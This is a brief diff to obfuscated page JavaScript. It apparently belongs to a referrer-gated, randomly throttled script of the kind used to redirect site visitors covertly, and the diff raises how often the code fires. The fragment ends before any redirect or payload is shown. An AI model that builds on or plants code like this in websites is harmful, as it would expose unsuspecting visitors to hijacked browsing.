@@ -3,7 +3,7 @@ window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU")
 
 var ua124rt = navigator.userAgent.toLowerCase();
 var odgau = Math.floor((Math.random() * 10) + 1);
-if(odgau <= 3) {
+if(odgau >= 3) {
 (function(window, location) {
 var tybn = document.referrer;
   if(tybn.length >= 8){
